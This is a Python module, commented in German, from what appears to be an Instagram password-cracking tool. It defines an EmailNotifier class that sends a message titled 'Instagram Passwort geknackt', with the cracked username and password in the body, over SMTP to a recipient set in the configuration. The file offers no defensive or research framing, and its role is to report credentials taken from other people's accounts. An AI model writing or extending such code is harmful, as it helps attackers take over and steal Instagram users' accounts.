import smtplib
import logging
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Dict, Any

logger = logging.getLogger(__name__)


class EmailNotifier:
    """Versendet Email-Benachrichtigungen bei erfolgreichem Passwort-Fund"""

    def __init__(self, config: Dict[str, Any]):
        self.config = config.get("email", {})
        self.enabled = self.config.get("enabled", False)
        self.sender_email = self.config.get("sender_email")
        self.sender_password = self.config.get("sender_password")
        self.recipient_email = self.config.get("recipient_email")
        self.smtp_server = self.config.get("smtp_server", "smtp.gmail.com")
        self.smtp_port = self.config.get("smtp_port", 587)

    def send_success_notification(self, username: str, password: str) -> bool:
        """Sendet Email bei erfolgreichem Passwort-Fund"""
        if not self.enabled:
            logger.info("Email-Benachrichtigungen deaktiviert.")
            return True

        if not self.sender_email or not self.sender_password:
            logger.warning("Email-Konfiguration unvollständig (Absender oder Passwort fehlt).")
            return False

        try:
            # Erstelle Email
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.recipient_email
            msg['Subject'] = f"🎉 Instagram Passwort geknackt: {username}"

            body = f"""
Erfolgreich! Das Instagram-Passwort wurde geknackt.

Benutzername: {username}
Passwort: {password}

Dieses Skript wurde um {self.__get_timestamp()} ausgeführt.
            """

            msg.attach(MIMEText(body, 'plain', 'utf-8'))

            # Sende Email
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)

            logger.info(f"Email-Benachrichtigung an {self.recipient_email} versendet.")
            return True

        except smtplib.SMTPAuthenticationError:
            logger.error("SMTP-Authentifizierung fehlgeschlagen. Überprüfe Email und Passwort.")
            return False
        except smtplib.SMTPException as e:
            logger.error(f"SMTP-Fehler beim Versand der Email: {e}")
            return False
        except Exception as e:
            logger.error(f"Fehler beim Email-Versand: {e}")
            return False

    @staticmethod
    def __get_timestamp() -> str:
        from datetime import datetime
        return datetime.now().strftime("%d.%m.%Y %H:%M:%S")
